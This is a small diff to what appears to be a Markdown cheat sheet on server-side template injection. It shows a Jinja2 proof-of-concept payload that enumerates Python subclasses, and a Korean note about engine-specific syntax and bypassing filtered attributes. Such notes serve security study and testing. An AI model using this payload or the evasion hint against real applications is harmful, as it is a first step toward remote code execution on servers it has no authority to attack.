@@ -16,8 +16,9 @@ curl
 
 ## PoC
 ```
-{{''.__class__.__mro__[1].__subclasses__()}}  # Jinja2
+{{''.__class__.__mro__[1].__subclasses__()}}
 ```
+(Jinja2)
 
 ## Pitfalls
 엔진별 문법 상이; 필터된 속성 우회
